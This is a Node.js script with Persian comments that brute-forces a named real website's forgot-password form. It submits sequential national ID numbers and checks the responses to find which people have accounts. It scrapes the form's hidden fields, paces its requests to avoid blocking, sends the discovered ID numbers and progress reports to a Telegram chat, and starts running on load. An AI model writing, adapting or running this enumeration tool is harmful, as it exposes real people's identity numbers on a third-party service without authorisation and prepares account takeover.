import dotenv from "dotenv";
import TelegramBot from "node-telegram-bot-api";
import { JSDOM } from "jsdom";

dotenv.config();

const TOKEN = process.env.TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bot = new TelegramBot(TOKEN, { polling: true });

// ===============================
// تابع چک کردن کاربر
// ===============================
async function checkUserExists(nationalNo) {
  const url = "https://haftometir.modabberonline.com/ForgetPassword.aspx";

  try {
    // GET صفحه اول
    const pageRes = await fetch(url, { method: "GET" });
    const pageHtml = await pageRes.text();

    // jsdom برای Node.js
    const dom = new JSDOM(pageHtml);
    const doc = dom.window.document;

    const formData = new URLSearchParams();
    doc.querySelectorAll('input[type="hidden"]').forEach((input) => {
      if (input.name) formData.append(input.name, input.value || "");
    });

    formData.append("Radio1", "rbPersonal");
    formData.append("txtNationalNo", nationalNo);
    formData.append("ddlYears", "51");
    formData.append("btnGetMobileNumber", "ارسال");

    // POST
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: formData,
    });

    const resHtml = await response.text();

    const exists =
      resHtml.includes("کد تایید") ||
      resHtml.includes("پیامک") ||
      resHtml.includes("موبایل") ||
      resHtml.includes("txtVerifyCode") ||
      resHtml.includes("pnlVerifyCode");

    return { exists };
  } catch (err) {
    return { exists: null, error: err.message };
  }
}

// ===============================
// Brute Force Sequential با تلگرام
// ===============================
async function bruteForceAll(start = 0, end = 100) {
  console.log("🚀 شروع Brute Force ...");

  let count = 0;
  let foundCount = 0;

  for (let i = start; i <= end; i++) {
    const nationalNo = i.toString().padStart(10, "0");

    console.log("⏳ تست:", nationalNo);

    const result = await checkUserExists(nationalNo);

    if (result.exists) {
      foundCount++;
      console.log(`🎯🎉 کاربر پیدا شد → ${nationalNo}`);
      bot.sendMessage(
        CHAT_ID,
        `🎯 کاربر پیدا شد → <code>${nationalNo}</code>`,
        {
          parse_mode: "HTML",
        }
      );
    } else if (result.error) {
      console.log(`❌ خطا → ${result.error}`);
    }

    count++;

    // 🔔 هر 100 تا → ارسال تلگرام
    if (count % 100 === 0) {
      const msg = `⏳ وضعیت:\nتست شده: ${count}\nپیدا شده: ${foundCount}\nآخرین: ${nationalNo}`;
      bot.sendMessage(CHAT_ID, msg);
    }

    // فاصله کوتاه برای جلوگیری از بلاک
    await new Promise((r) => setTimeout(r, 200));
  }

  console.log("🔥 پایان Brute Force");
  bot.sendMessage(
    CHAT_ID,
    `🔥 پایان Brute Force\n✅ کل تست شده: ${count}\n🎯 پیدا شده: ${foundCount}`
  );
}

// ===============================
// ▶️ اجرای واقعی
// ===============================
bruteForceAll(0, 500); // میتونی start و end رو تغییر بدی
